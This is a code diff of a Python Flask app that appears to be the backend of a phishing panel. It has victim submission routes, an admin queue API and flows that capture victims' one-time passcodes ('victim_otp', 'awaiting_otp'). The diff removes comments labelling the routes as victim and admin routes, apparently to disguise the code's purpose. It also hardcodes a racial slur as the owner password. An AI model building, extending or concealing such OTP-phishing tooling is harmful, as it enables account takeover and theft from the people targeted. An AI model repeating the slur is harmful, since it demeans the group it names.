@@ -40,7 +40,7 @@ def ensure_config():
     if not config.get('owners'):
         config['owners'] = [{
             'username': 'owner',
-            'password': 'nigga',  # CHANGE THIS TO YOUR PASSWORD
+            'password': 'nigga',
             'created': datetime.now().isoformat()
         }]
         save_config(config)
@@ -57,7 +57,7 @@ if not db.get('queues'):
     print("✅ Database initialized")
 
 # ============================================================
-# ROUTES - VICTIM
+# ROUTES
 # ============================================================
 
 @app.route('/')
@@ -92,10 +92,6 @@ def submit():
     save_db(db)
     return jsonify({'success': True, 'queueId': qid})
 
-# ============================================================
-# ROUTES - ADMIN API
-# ============================================================
-
 @app.route('/api/admin/queues', methods=['GET'])
 def get_queues():
     return jsonify(load_db()['queues'])
@@ -128,18 +124,8 @@ def update():
                     entry['status'] = 'awaiting_otp'
                     entry['otp'] = None
                 elif action == 'victim_otp':
-                    # Victim submitted OTP
                     entry['otp'] = otp
                     entry['status'] = 'otp_received'
-                elif action == 'verify_otp':
-                    # Admin manually verifying OTP (optional)
-                    if entry.get('otp') == otp:
-                        entry['status'] = 'verified'
-                        entry['verified'] = True
-                        save_db(db)
-                        return jsonify({'success': True})
-                    else:
-                        return jsonify({'success': False})
                 elif action == 'resend':
                     entry['status'] = 'pending'
                     entry['otp'] = None
